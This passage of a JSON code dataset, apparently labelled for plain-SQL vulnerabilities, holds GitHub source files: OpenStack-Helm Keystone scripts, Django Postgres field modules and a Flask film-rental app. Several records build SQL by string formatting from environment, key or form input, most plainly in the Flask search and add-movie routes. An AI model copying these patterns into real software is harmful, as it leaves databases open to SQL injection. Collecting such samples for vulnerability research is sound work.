        "source": "{{/*\nCopyright 2017 The Openstack-Helm Authors.\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n   http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n*/}}\n\n#!/usr/bin/env python\nimport os\nimport sys\nimport ConfigParser\nimport logging\nfrom sqlalchemy import create_engine\n\n# Create logger, console handler and formatter\nlogger = logging.getLogger('OpenStack-Helm Keystone Endpoint management')\nlogger.setLevel(logging.DEBUG)\nch = logging.StreamHandler()\nch.setLevel(logging.DEBUG)\nformatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n\n# Set the formatter and add the handler\nch.setFormatter(formatter)\nlogger.addHandler(ch)\n\n# Get the connection string for the service db\nif \"OPENSTACK_CONFIG_FILE\" in os.environ:\n    os_conf = os.environ['OPENSTACK_CONFIG_FILE']\n    if \"OPENSTACK_CONFIG_DB_SECTION\" in os.environ:\n        os_conf_section = os.environ['OPENSTACK_CONFIG_DB_SECTION']\n    else:\n        logger.critical('environment variable OPENSTACK_CONFIG_DB_SECTION not set')\n        sys.exit(1)\n    if \"OPENSTACK_CONFIG_DB_KEY\" in os.environ:\n        os_conf_key = os.environ['OPENSTACK_CONFIG_DB_KEY']\n    else:\n        logger.critical('environment variable OPENSTACK_CONFIG_DB_KEY not set')\n        sys.exit(1)\n    try:\n        config = ConfigParser.RawConfigParser()\n        logger.info(\"Using {0} as db config source\".format(os_conf))\n        config.read(os_conf)\n        logger.info(\"Trying to load db config from {0}:{1}\".format(\n            os_conf_section, os_conf_key))\n        user_db_conn = config.get(os_conf_section, os_conf_key)\n        logger.info(\"Got config from {0}\".format(os_conf))\n    except:\n        logger.critical(\"Tried to load config from {0} but failed.\".format(os_conf))\n        raise\nelif \"DB_CONNECTION\" in os.environ:\n    user_db_conn = os.environ['DB_CONNECTION']\n    logger.info('Got config from DB_CONNECTION env var')\nelse:\n    logger.critical('Could not get db config, either from config file or env var')\n    sys.exit(1)\n\n# User DB engine\ntry:\n    user_engine = create_engine(user_db_conn)\nexcept:\n    logger.critical('Could not get user database config')\n    raise\n\n# Set Internal Endpoint\ntry:\n    endpoint_url = os.environ['OS_BOOTSTRAP_INTERNAL_URL']\n    user_engine.execute(\n        \"update endpoint set url = '{0}' where interface ='internal' and service_id = (select id from service where service.type = 'identity')\".\n        format(endpoint_url))\nexcept:\n    logger.critical(\"Could not update internal endpoint\")\n    raise\n\n# Set Admin Endpoint\ntry:\n    endpoint_url = os.environ['OS_BOOTSTRAP_ADMIN_URL']\n    user_engine.execute(\n        \"update endpoint set url = '{0}' where interface ='admin' and service_id = (select id from service where service.type = 'identity')\".\n        format(endpoint_url))\nexcept:\n    logger.critical(\"Could not update admin endpoint\")\n    raise\n\n# Set Public Endpoint\ntry:\n    endpoint_url = os.environ['OS_BOOTSTRAP_PUBLIC_URL']\n    user_engine.execute(\n        \"update endpoint set url = '{0}' where interface ='public' and service_id = (select id from service where service.type = 'identity')\".\n        format(endpoint_url))\nexcept:\n    logger.critical(\"Could not update public endpoint\")\n    raise\n\n# Print endpoints\ntry:\n    endpoints = user_engine.execute(\n        \"select interface, url from endpoint where service_id = (select id from service where service.type = 'identity')\"\n    ).fetchall()\n    for row in endpoints:\n        logger.info(\"endpoint ({0}): {1}\".format(row[0], row[1]))\nexcept:\n    logger.critical(\"Could not update endpoint\")\n    raise\n\nlogger.info('Finished Endpoint Management')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/op317q/openstack-helm/blob/cc4c9cdc9dca454430456493fcb0cefc1e8ecab9",
        "file_path": "/keystone/templates/bin/_fernet-manage.py.tpl",
        "source": "#!/usr/bin/env python\n\n{{/*\nCopyright 2017 The Openstack-Helm Authors.\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n   http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n*/}}\n\nimport argparse\nimport base64\nimport errno\nimport grp\nimport logging\nimport os\nimport pwd\nimport re\nimport six\nimport subprocess\nimport sys\nimport time\n\nimport requests\n\nFERNET_DIR = os.environ['KEYSTONE_KEYS_REPOSITORY']\nKEYSTONE_USER = os.environ['KEYSTONE_USER']\nKEYSTONE_GROUP = os.environ['KEYSTONE_GROUP']\nNAMESPACE = os.environ['KUBERNETES_NAMESPACE']\n\n# k8s connection data\nKUBE_HOST = None\nKUBE_CERT = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'\nKUBE_TOKEN = None\n\nLOG_DATEFMT = \"%Y-%m-%d %H:%M:%S\"\nLOG_FORMAT = \"%(asctime)s.%(msecs)03d - %(levelname)s - %(message)s\"\nlogging.basicConfig(format=LOG_FORMAT, datefmt=LOG_DATEFMT)\nLOG = logging.getLogger(__name__)\nLOG.setLevel(logging.INFO)\n\n\ndef read_kube_config():\n    global KUBE_HOST, KUBE_TOKEN\n    KUBE_HOST = \"https://%s:%s\" % ('kubernetes.default',\n                                   os.environ['KUBERNETES_SERVICE_PORT'])\n    with open('/var/run/secrets/kubernetes.io/serviceaccount/token', 'r') as f:\n        KUBE_TOKEN = f.read()\n\n\ndef get_secret_definition(name):\n    url = '%s/api/v1/namespaces/%s/secrets/%s' % (KUBE_HOST, NAMESPACE, name)\n    resp = requests.get(url,\n                        headers={'Authorization': 'Bearer %s' % KUBE_TOKEN},\n                        verify=KUBE_CERT)\n    if resp.status_code != 200:\n        LOG.error('Cannot get secret %s.', name)\n        LOG.error(resp.text)\n        return None\n    return resp.json()\n\n\ndef update_secret(name, secret):\n    url = '%s/api/v1/namespaces/%s/secrets/%s' % (KUBE_HOST, NAMESPACE, name)\n    resp = requests.put(url,\n                        json=secret,\n                        headers={'Authorization': 'Bearer %s' % KUBE_TOKEN},\n                        verify=KUBE_CERT)\n    if resp.status_code != 200:\n        LOG.error('Cannot update secret %s.', name)\n        LOG.error(resp.text)\n        return False\n    return True\n\n\ndef read_from_files():\n    keys = filter(\n        lambda name: os.path.isfile(FERNET_DIR + name) and re.match(\"^\\d+$\",\n                                                                    name),\n        os.listdir(FERNET_DIR)\n    )\n    data = {}\n    for key in keys:\n        with open(FERNET_DIR + key, 'r') as f:\n            data[key] = f.read()\n    if len(keys):\n        LOG.debug(\"Keys read from files: %s\", keys)\n    else:\n        LOG.warn(\"No keys were read from files.\")\n    return data\n\n\ndef get_keys_data():\n    keys = read_from_files()\n    return dict([(key, base64.b64encode(value.encode()).decode())\n                for (key, value) in six.iteritems(keys)])\n\n\ndef write_to_files(data):\n    if not os.path.exists(os.path.dirname(FERNET_DIR)):\n        try:\n            os.makedirs(os.path.dirname(FERNET_DIR))\n        except OSError as exc: # Guard against race condition\n            if exc.errno != errno.EEXIST:\n                raise\n        uid = pwd.getpwnam(KEYSTONE_USER).pw_uid\n        gid = grp.getgrnam(KEYSTONE_GROUP).gr_gid\n        os.chown(FERNET_DIR, uid, gid)\n\n    for (key, value) in six.iteritems(data):\n        with open(FERNET_DIR + key, 'w') as f:\n            decoded_value = base64.b64decode(value).decode()\n            f.write(decoded_value)\n            LOG.debug(\"Key %s: %s\", key, decoded_value)\n    LOG.info(\"%s keys were written\", len(data))\n\n\ndef execute_command(cmd):\n    LOG.info(\"Executing 'keystone-manage %s --keystone-user=%s \"\n             \"--keystone-group=%s' command.\",\n             cmd, KEYSTONE_USER, KEYSTONE_GROUP)\n    subprocess.call(['keystone-manage', cmd,\n                     '--keystone-user=%s' % KEYSTONE_USER,\n                     '--keystone-group=%s' % KEYSTONE_GROUP])\n\ndef main():\n    parser = argparse.ArgumentParser()\n    parser.add_argument('command', choices=['fernet_setup', 'fernet_rotate',\n                                            'credential_setup',\n                                            'credential_rotate'])\n    args = parser.parse_args()\n\n    is_credential = args.command.startswith('credential')\n\n    SECRET_NAME = ('keystone-credential-keys' if is_credential else\n                   'keystone-fernet-keys')\n\n    read_kube_config()\n    secret = get_secret_definition(SECRET_NAME)\n    if not secret:\n        LOG.error(\"Secret '%s' does not exist.\", SECRET_NAME)\n        sys.exit(1)\n\n    if args.command in ('fernet_rotate', 'credential_rotate'):\n        LOG.info(\"Copying existing %s keys from secret '%s' to %s.\",\n                 'credential' if is_credential else 'fernet', SECRET_NAME,\n                 FERNET_DIR)\n        write_to_files(secret['data'])\n\n    execute_command(args.command)\n\n    LOG.info(\"Updating data for '%s' secret.\", SECRET_NAME)\n    updated_keys = get_keys_data()\n    secret['data'] = updated_keys\n    if not update_secret(SECRET_NAME, secret):\n        sys.exit(1)\n    LOG.info(\"%s fernet keys have been placed to secret '%s'\",\n             len(updated_keys), SECRET_NAME)\n    LOG.debug(\"Placed keys: %s\", updated_keys)\n    LOG.info(\"%s keys %s has been completed\",\n             \"Credential\" if is_credential else 'Fernet',\n             \"rotation\" if args.command.endswith('_rotate') else \"generation\")\n\n    if args.command == 'credential_rotate':\n        # `credential_rotate` needs doing `credential_migrate` as well once all\n        # of the nodes have the new keys. So we'll sleep configurable amount of\n        # time to make sure k8s reloads the secrets in all pods and then\n        # execute `credential_migrate`.\n\n        migrate_wait = int(os.getenv('KEYSTONE_CREDENTIAL_MIGRATE_WAIT', \"60\"))\n        LOG.info(\"Waiting %d seconds to execute `credential_migrate`.\",\n                 migrate_wait)\n        time.sleep(migrate_wait)\n\n        execute_command('credential_migrate')\n\nif __name__ == \"__main__\":\n    main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/demircolorweb/django/blob/4b78420d250df5e21763633871e486ee76728cc4",
        "file_path": "/django/contrib/postgres/fields/hstore.py",
        "source": "import json\n\nfrom django.contrib.postgres import forms, lookups\nfrom django.contrib.postgres.fields.array import ArrayField\nfrom django.core import exceptions\nfrom django.db.models import Field, TextField, Transform\nfrom django.utils.translation import gettext_lazy as _\n\nfrom .mixins import CheckFieldDefaultMixin\n\n__all__ = ['HStoreField']\n\n\nclass HStoreField(CheckFieldDefaultMixin, Field):\n    empty_strings_allowed = False\n    description = _('Map of strings to strings/nulls')\n    default_error_messages = {\n        'not_a_string': _('The value of %(key)s is not a string or null.'),\n    }\n    _default_hint = ('dict', '{}')\n\n    def db_type(self, connection):\n        return 'hstore'\n\n    def get_transform(self, name):\n        transform = super().get_transform(name)\n        if transform:\n            return transform\n        return KeyTransformFactory(name)\n\n    def validate(self, value, model_instance):\n        super().validate(value, model_instance)\n        for key, val in value.items():\n            if not isinstance(val, str) and val is not None:\n                raise exceptions.ValidationError(\n                    self.error_messages['not_a_string'],\n                    code='not_a_string',\n                    params={'key': key},\n                )\n\n    def to_python(self, value):\n        if isinstance(value, str):\n            value = json.loads(value)\n        return value\n\n    def value_to_string(self, obj):\n        return json.dumps(self.value_from_object(obj))\n\n    def formfield(self, **kwargs):\n        return super().formfield(**{\n            'form_class': forms.HStoreField,\n            **kwargs,\n        })\n\n    def get_prep_value(self, value):\n        value = super().get_prep_value(value)\n\n        if isinstance(value, dict):\n            prep_value = {}\n            for key, val in value.items():\n                key = str(key)\n                if val is not None:\n                    val = str(val)\n                prep_value[key] = val\n            value = prep_value\n\n        if isinstance(value, list):\n            value = [str(item) for item in value]\n\n        return value\n\n\nHStoreField.register_lookup(lookups.DataContains)\nHStoreField.register_lookup(lookups.ContainedBy)\nHStoreField.register_lookup(lookups.HasKey)\nHStoreField.register_lookup(lookups.HasKeys)\nHStoreField.register_lookup(lookups.HasAnyKeys)\n\n\nclass KeyTransform(Transform):\n    output_field = TextField()\n\n    def __init__(self, key_name, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.key_name = key_name\n\n    def as_sql(self, compiler, connection):\n        lhs, params = compiler.compile(self.lhs)\n        return \"(%s -> '%s')\" % (lhs, self.key_name), params\n\n\nclass KeyTransformFactory:\n\n    def __init__(self, key_name):\n        self.key_name = key_name\n\n    def __call__(self, *args, **kwargs):\n        return KeyTransform(self.key_name, *args, **kwargs)\n\n\n@HStoreField.register_lookup\nclass KeysTransform(Transform):\n    lookup_name = 'keys'\n    function = 'akeys'\n    output_field = ArrayField(TextField())\n\n\n@HStoreField.register_lookup\nclass ValuesTransform(Transform):\n    lookup_name = 'values'\n    function = 'avals'\n    output_field = ArrayField(TextField())\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/demircolorweb/django/blob/4b78420d250df5e21763633871e486ee76728cc4",
        "file_path": "/django/contrib/postgres/fields/jsonb.py",
        "source": "import json\n\nfrom psycopg2.extras import Json\n\nfrom django.contrib.postgres import forms, lookups\nfrom django.core import exceptions\nfrom django.db.models import (\n    Field, TextField, Transform, lookups as builtin_lookups,\n)\nfrom django.utils.translation import gettext_lazy as _\n\nfrom .mixins import CheckFieldDefaultMixin\n\n__all__ = ['JSONField']\n\n\nclass JsonAdapter(Json):\n    \"\"\"\n    Customized psycopg2.extras.Json to allow for a custom encoder.\n    \"\"\"\n    def __init__(self, adapted, dumps=None, encoder=None):\n        self.encoder = encoder\n        super().__init__(adapted, dumps=dumps)\n\n    def dumps(self, obj):\n        options = {'cls': self.encoder} if self.encoder else {}\n        return json.dumps(obj, **options)\n\n\nclass JSONField(CheckFieldDefaultMixin, Field):\n    empty_strings_allowed = False\n    description = _('A JSON object')\n    default_error_messages = {\n        'invalid': _(\"Value must be valid JSON.\"),\n    }\n    _default_hint = ('dict', '{}')\n\n    def __init__(self, verbose_name=None, name=None, encoder=None, **kwargs):\n        if encoder and not callable(encoder):\n            raise ValueError(\"The encoder parameter must be a callable object.\")\n        self.encoder = encoder\n        super().__init__(verbose_name, name, **kwargs)\n\n    def db_type(self, connection):\n        return 'jsonb'\n\n    def deconstruct(self):\n        name, path, args, kwargs = super().deconstruct()\n        if self.encoder is not None:\n            kwargs['encoder'] = self.encoder\n        return name, path, args, kwargs\n\n    def get_transform(self, name):\n        transform = super().get_transform(name)\n        if transform:\n            return transform\n        return KeyTransformFactory(name)\n\n    def get_prep_value(self, value):\n        if value is not None:\n            return JsonAdapter(value, encoder=self.encoder)\n        return value\n\n    def validate(self, value, model_instance):\n        super().validate(value, model_instance)\n        options = {'cls': self.encoder} if self.encoder else {}\n        try:\n            json.dumps(value, **options)\n        except TypeError:\n            raise exceptions.ValidationError(\n                self.error_messages['invalid'],\n                code='invalid',\n                params={'value': value},\n            )\n\n    def value_to_string(self, obj):\n        return self.value_from_object(obj)\n\n    def formfield(self, **kwargs):\n        return super().formfield(**{\n            'form_class': forms.JSONField,\n            **kwargs,\n        })\n\n\nJSONField.register_lookup(lookups.DataContains)\nJSONField.register_lookup(lookups.ContainedBy)\nJSONField.register_lookup(lookups.HasKey)\nJSONField.register_lookup(lookups.HasKeys)\nJSONField.register_lookup(lookups.HasAnyKeys)\nJSONField.register_lookup(lookups.JSONExact)\n\n\nclass KeyTransform(Transform):\n    operator = '->'\n    nested_operator = '#>'\n\n    def __init__(self, key_name, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.key_name = key_name\n\n    def as_sql(self, compiler, connection):\n        key_transforms = [self.key_name]\n        previous = self.lhs\n        while isinstance(previous, KeyTransform):\n            key_transforms.insert(0, previous.key_name)\n            previous = previous.lhs\n        lhs, params = compiler.compile(previous)\n        if len(key_transforms) > 1:\n            return \"(%s %s %%s)\" % (lhs, self.nested_operator), [key_transforms] + params\n        try:\n            int(self.key_name)\n        except ValueError:\n            lookup = \"'%s'\" % self.key_name\n        else:\n            lookup = \"%s\" % self.key_name\n        return \"(%s %s %s)\" % (lhs, self.operator, lookup), params\n\n\nclass KeyTextTransform(KeyTransform):\n    operator = '->>'\n    nested_operator = '#>>'\n    output_field = TextField()\n\n\nclass KeyTransformTextLookupMixin:\n    \"\"\"\n    Mixin for combining with a lookup expecting a text lhs from a JSONField\n    key lookup. Make use of the ->> operator instead of casting key values to\n    text and performing the lookup on the resulting representation.\n    \"\"\"\n    def __init__(self, key_transform, *args, **kwargs):\n        assert isinstance(key_transform, KeyTransform)\n        key_text_transform = KeyTextTransform(\n            key_transform.key_name, *key_transform.source_expressions, **key_transform.extra\n        )\n        super().__init__(key_text_transform, *args, **kwargs)\n\n\nclass KeyTransformIExact(KeyTransformTextLookupMixin, builtin_lookups.IExact):\n    pass\n\n\nclass KeyTransformIContains(KeyTransformTextLookupMixin, builtin_lookups.IContains):\n    pass\n\n\nclass KeyTransformStartsWith(KeyTransformTextLookupMixin, builtin_lookups.StartsWith):\n    pass\n\n\nclass KeyTransformIStartsWith(KeyTransformTextLookupMixin, builtin_lookups.IStartsWith):\n    pass\n\n\nclass KeyTransformEndsWith(KeyTransformTextLookupMixin, builtin_lookups.EndsWith):\n    pass\n\n\nclass KeyTransformIEndsWith(KeyTransformTextLookupMixin, builtin_lookups.IEndsWith):\n    pass\n\n\nclass KeyTransformRegex(KeyTransformTextLookupMixin, builtin_lookups.Regex):\n    pass\n\n\nclass KeyTransformIRegex(KeyTransformTextLookupMixin, builtin_lookups.IRegex):\n    pass\n\n\nKeyTransform.register_lookup(KeyTransformIExact)\nKeyTransform.register_lookup(KeyTransformIContains)\nKeyTransform.register_lookup(KeyTransformStartsWith)\nKeyTransform.register_lookup(KeyTransformIStartsWith)\nKeyTransform.register_lookup(KeyTransformEndsWith)\nKeyTransform.register_lookup(KeyTransformIEndsWith)\nKeyTransform.register_lookup(KeyTransformRegex)\nKeyTransform.register_lookup(KeyTransformIRegex)\n\n\nclass KeyTransformFactory:\n\n    def __init__(self, key_name):\n        self.key_name = key_name\n\n    def __call__(self, *args, **kwargs):\n        return KeyTransform(self.key_name, *args, **kwargs)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/demircolorweb/django/blob/0e02e496cdc75741a789f8694f66e776bb8214f1",
        "file_path": "/django/contrib/postgres/fields/array.py",
        "source": "import json\n\nfrom django.contrib.postgres import lookups\nfrom django.contrib.postgres.forms import SimpleArrayField\nfrom django.contrib.postgres.validators import ArrayMaxLengthValidator\nfrom django.core import checks, exceptions\nfrom django.db.models import Field, IntegerField, Transform\nfrom django.db.models.lookups import Exact, In\nfrom django.utils.translation import gettext_lazy as _\n\nfrom ..utils import prefix_validation_error\nfrom .mixins import CheckFieldDefaultMixin\nfrom .utils import AttributeSetter\n\n__all__ = ['ArrayField']\n\n\nclass ArrayField(CheckFieldDefaultMixin, Field):\n    empty_strings_allowed = False\n    default_error_messages = {\n        'item_invalid': _('Item %(nth)s in the array did not validate:'),\n        'nested_array_mismatch': _('Nested arrays must have the same length.'),\n    }\n    _default_hint = ('list', '[]')\n\n    def __init__(self, base_field, size=None, **kwargs):\n        self.base_field = base_field\n        self.size = size\n        if self.size:\n            self.default_validators = [*self.default_validators, ArrayMaxLengthValidator(self.size)]\n        # For performance, only add a from_db_value() method if the base field\n        # implements it.\n        if hasattr(self.base_field, 'from_db_value'):\n            self.from_db_value = self._from_db_value\n        super().__init__(**kwargs)\n\n    @property\n    def model(self):\n        try:\n            return self.__dict__['model']\n        except KeyError:\n            raise AttributeError(\"'%s' object has no attribute 'model'\" % self.__class__.__name__)\n\n    @model.setter\n    def model(self, model):\n        self.__dict__['model'] = model\n        self.base_field.model = model\n\n    def check(self, **kwargs):\n        errors = super().check(**kwargs)\n        if self.base_field.remote_field:\n            errors.append(\n                checks.Error(\n                    'Base field for array cannot be a related field.',\n                    obj=self,\n                    id='postgres.E002'\n                )\n            )\n        else:\n            # Remove the field name checks as they are not needed here.\n            base_errors = self.base_field.check()\n            if base_errors:\n                messages = '\\n    '.join('%s (%s)' % (error.msg, error.id) for error in base_errors)\n                errors.append(\n                    checks.Error(\n                        'Base field for array has errors:\\n    %s' % messages,\n                        obj=self,\n                        id='postgres.E001'\n                    )\n                )\n        return errors\n\n    def set_attributes_from_name(self, name):\n        super().set_attributes_from_name(name)\n        self.base_field.set_attributes_from_name(name)\n\n    @property\n    def description(self):\n        return 'Array of %s' % self.base_field.description\n\n    def db_type(self, connection):\n        size = self.size or ''\n        return '%s[%s]' % (self.base_field.db_type(connection), size)\n\n    def get_placeholder(self, value, compiler, connection):\n        return '%s::{}'.format(self.db_type(connection))\n\n    def get_db_prep_value(self, value, connection, prepared=False):\n        if isinstance(value, (list, tuple)):\n            return [self.base_field.get_db_prep_value(i, connection, prepared=False) for i in value]\n        return value\n\n    def deconstruct(self):\n        name, path, args, kwargs = super().deconstruct()\n        if path == 'django.contrib.postgres.fields.array.ArrayField':\n            path = 'django.contrib.postgres.fields.ArrayField'\n        kwargs.update({\n            'base_field': self.base_field.clone(),\n            'size': self.size,\n        })\n        return name, path, args, kwargs\n\n    def to_python(self, value):\n        if isinstance(value, str):\n            # Assume we're deserializing\n            vals = json.loads(value)\n            value = [self.base_field.to_python(val) for val in vals]\n        return value\n\n    def _from_db_value(self, value, expression, connection):\n        if value is None:\n            return value\n        return [\n            self.base_field.from_db_value(item, expression, connection)\n            for item in value\n        ]\n\n    def value_to_string(self, obj):\n        values = []\n        vals = self.value_from_object(obj)\n        base_field = self.base_field\n\n        for val in vals:\n            if val is None:\n                values.append(None)\n            else:\n                obj = AttributeSetter(base_field.attname, val)\n                values.append(base_field.value_to_string(obj))\n        return json.dumps(values)\n\n    def get_transform(self, name):\n        transform = super().get_transform(name)\n        if transform:\n            return transform\n        if '_' not in name:\n            try:\n                index = int(name)\n            except ValueError:\n                pass\n            else:\n                index += 1  # postgres uses 1-indexing\n                return IndexTransformFactory(index, self.base_field)\n        try:\n            start, end = name.split('_')\n            start = int(start) + 1\n            end = int(end)  # don't add one here because postgres slices are weird\n        except ValueError:\n            pass\n        else:\n            return SliceTransformFactory(start, end)\n\n    def validate(self, value, model_instance):\n        super().validate(value, model_instance)\n        for index, part in enumerate(value):\n            try:\n                self.base_field.validate(part, model_instance)\n            except exceptions.ValidationError as error:\n                raise prefix_validation_error(\n                    error,\n                    prefix=self.error_messages['item_invalid'],\n                    code='item_invalid',\n                    params={'nth': index + 1},\n                )\n        if isinstance(self.base_field, ArrayField):\n            if len({len(i) for i in value}) > 1:\n                raise exceptions.ValidationError(\n                    self.error_messages['nested_array_mismatch'],\n                    code='nested_array_mismatch',\n                )\n\n    def run_validators(self, value):\n        super().run_validators(value)\n        for index, part in enumerate(value):\n            try:\n                self.base_field.run_validators(part)\n            except exceptions.ValidationError as error:\n                raise prefix_validation_error(\n                    error,\n                    prefix=self.error_messages['item_invalid'],\n                    code='item_invalid',\n                    params={'nth': index + 1},\n                )\n\n    def formfield(self, **kwargs):\n        return super().formfield(**{\n            'form_class': SimpleArrayField,\n            'base_field': self.base_field.formfield(),\n            'max_length': self.size,\n            **kwargs,\n        })\n\n\n@ArrayField.register_lookup\nclass ArrayContains(lookups.DataContains):\n    def as_sql(self, qn, connection):\n        sql, params = super().as_sql(qn, connection)\n        sql = '%s::%s' % (sql, self.lhs.output_field.db_type(connection))\n        return sql, params\n\n\n@ArrayField.register_lookup\nclass ArrayContainedBy(lookups.ContainedBy):\n    def as_sql(self, qn, connection):\n        sql, params = super().as_sql(qn, connection)\n        sql = '%s::%s' % (sql, self.lhs.output_field.db_type(connection))\n        return sql, params\n\n\n@ArrayField.register_lookup\nclass ArrayExact(Exact):\n    def as_sql(self, qn, connection):\n        sql, params = super().as_sql(qn, connection)\n        sql = '%s::%s' % (sql, self.lhs.output_field.db_type(connection))\n        return sql, params\n\n\n@ArrayField.register_lookup\nclass ArrayOverlap(lookups.Overlap):\n    def as_sql(self, qn, connection):\n        sql, params = super().as_sql(qn, connection)\n        sql = '%s::%s' % (sql, self.lhs.output_field.db_type(connection))\n        return sql, params\n\n\n@ArrayField.register_lookup\nclass ArrayLenTransform(Transform):\n    lookup_name = 'len'\n    output_field = IntegerField()\n\n    def as_sql(self, compiler, connection):\n        lhs, params = compiler.compile(self.lhs)\n        # Distinguish NULL and empty arrays\n        return (\n            'CASE WHEN %(lhs)s IS NULL THEN NULL ELSE '\n            'coalesce(array_length(%(lhs)s, 1), 0) END'\n        ) % {'lhs': lhs}, params\n\n\n@ArrayField.register_lookup\nclass ArrayInLookup(In):\n    def get_prep_lookup(self):\n        values = super().get_prep_lookup()\n        if hasattr(values, 'resolve_expression'):\n            return values\n        # In.process_rhs() expects values to be hashable, so convert lists\n        # to tuples.\n        prepared_values = []\n        for value in values:\n            if hasattr(value, 'resolve_expression'):\n                prepared_values.append(value)\n            else:\n                prepared_values.append(tuple(value))\n        return prepared_values\n\n\nclass IndexTransform(Transform):\n\n    def __init__(self, index, base_field, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.index = index\n        self.base_field = base_field\n\n    def as_sql(self, compiler, connection):\n        lhs, params = compiler.compile(self.lhs)\n        return '%s[%s]' % (lhs, self.index), params\n\n    @property\n    def output_field(self):\n        return self.base_field\n\n\nclass IndexTransformFactory:\n\n    def __init__(self, index, base_field):\n        self.index = index\n        self.base_field = base_field\n\n    def __call__(self, *args, **kwargs):\n        return IndexTransform(self.index, self.base_field, *args, **kwargs)\n\n\nclass SliceTransform(Transform):\n\n    def __init__(self, start, end, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self.start = start\n        self.end = end\n\n    def as_sql(self, compiler, connection):\n        lhs, params = compiler.compile(self.lhs)\n        return '%s[%s:%s]' % (lhs, self.start, self.end), params\n\n\nclass SliceTransformFactory:\n\n    def __init__(self, start, end):\n        self.start = start\n        self.end = end\n\n    def __call__(self, *args, **kwargs):\n        return SliceTransform(self.start, self.end, *args, **kwargs)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Elbertbiggs360/dvdrental/blob/0454681fbd2eec04be6e30b79159169b10b1a089",
        "file_path": "/app.py",
        "source": "import os\nfrom flask import Flask, render_template, abort, flash, redirect, url_for\nfrom psycopg2 import connect\nfrom config import app_config\nimport json\nimport decimal\nimport datetime\nfrom utils import Ratings\nfrom forms import MovieForm, SearchForm\n\napp = Flask(__name__)\napp_config_file = app_config[os.getenv('APP_SETTINGS') or 'development']\napp.config.from_object(app_config_file)\napp.config.from_pyfile('config.py')\nconn = connect(\n    database=app_config_file.DB_NAME,\n    host=app_config_file.DB_HOST,\n    user=app_config_file.DB_USER,\n    password=app_config_file.DB_PASSWORD)\ncur = conn.cursor()\n\n@app.route('/')\ndef index():\n    return render_template('index.html', title='Home')\n\n@app.route('/ping')\ndef healthcheck():\n    return 'ok'\n\n@app.route('/movies')\ndef movies():\n    try:\n        cur.execute('SELECT title FROM film')\n    except Exception as e:\n        print('Failing: ', e)\n    items = cur.fetchall()\n    return render_template('movies.html', movies=items, total=len(items))\n\n@app.route('/movies/<movie_name>')\ndef movie(movie_name):\n    return render_template('movie.html', movie_name=movie_name)\n\n@app.route('/actors/condition2')\ndef actors_filtered():\n    '''\n    Find the names (first and last) of all the actors and customers whose\n    first name is the same as the first name of the actor with ID 8.\n    Do not return the actor with ID 8 himself.\n    Note that you cannot use the name of the actor with ID 8 as a constant\n    (only the ID)\n    '''\n    cur.execute(f\"\"\"\n                    SELECT\n                        a.first_name a_first_name,\n                        a.last_name a_last_name,\n                        c.first_name c_first_name,\n                        c.last_name c_last_name\n                    FROM\n                        actor a\n                    INNER JOIN\n                        customer c ON a.first_name = c.first_name\n                    WHERE a.first_name IN (\n                        SELECT a.first_name from actor a WHERE actor_id = 8\n                    )\n                \"\"\"\n    )\n    res = cur.fetchall()\n    result_list = []\n    for row in res:\n        result_list.append(row[:2])\n        result_list.append(row[2:])\n    actor_8 = result_list.pop(0) # remove the actor with id 8 who is the first match\n    results = list(set(result_list))\n    return render_template('actors.html', title='Actors', actors=results)\n\n@app.route('/categories/condition3')\ndef categories_filtered():\n    '''b\n    Find all the film categories in which there are between 55 and 65 films.\n    Return the names of these categories and the number of films per category, sorted by the number of films.\n    '''\n    cur.execute(f\"\"\"\n                    select c.name, COUNT(fc.film_id) as num_film\n                    from category c\n                    join film_category fc\n                    ON c.category_id = fc.category_id\n                    GROUP BY c.name\n                    HAVING COUNT(fc.film_id) BETWEEN 55 AND 65\n                    ORDER BY COUNT(fc.film_id) DESC\n                \"\"\"\n    )\n    res = cur.fetchall()\n    data = json.dumps(res)\n    return render_template('categories.html', title='Categories', categories=res)\n\n@app.route('/movies/search', methods=['GET', 'POST'])\ndef search_films():\n    form = SearchForm()\n    if not form.validate_on_submit():\n        return render_template('search.html', title='Search for films', form=form)\n    search_terms = form.data['term'].split(' ')\n    search_string = ' & '.join(search_terms)\n    cur.execute(f\"SELECT * FROM film where fulltext @@ to_tsquery('{search_string}')\")\n    res = cur.fetchall()\n    return render_template('search_results.html', title='Home', res=len(res))\n\n@app.route('/movies/add', methods=['GET', 'POST'])\ndef add_movie():\n    form = MovieForm()\n    if not form.validate_on_submit():\n        return render_template('new_movie.html', title='Add New Movie', form=form)\n    lang_id = add_language(form.data['language'])\n    movie = {\n            'title': '',\n            'description': '',\n            'release_year': 0,\n            'rental_duration': 0,\n            'rental_rate': 0.00,\n            'length': 0,\n            'replacement_cost': 0.00\n        }\n    for k, v in movie.items():\n        movie[k] = form.data[k]\n    movie['language_id'] = movie.get('language_id', lang_id)\n    cur.execute(\n        \"\"\"\n        INSERT INTO film (title, description, release_year, language_id, rental_duration, rental_rate, length, replacement_cost)\n        VALUES ('{}', '{}', {}, {}, {}, {}, {}, {})\n        \"\"\".format(*[v for k, v in movie.items()])\n    )\n    try:\n        cur.execute(f\"SELECT * FROM film where fulltext @@ 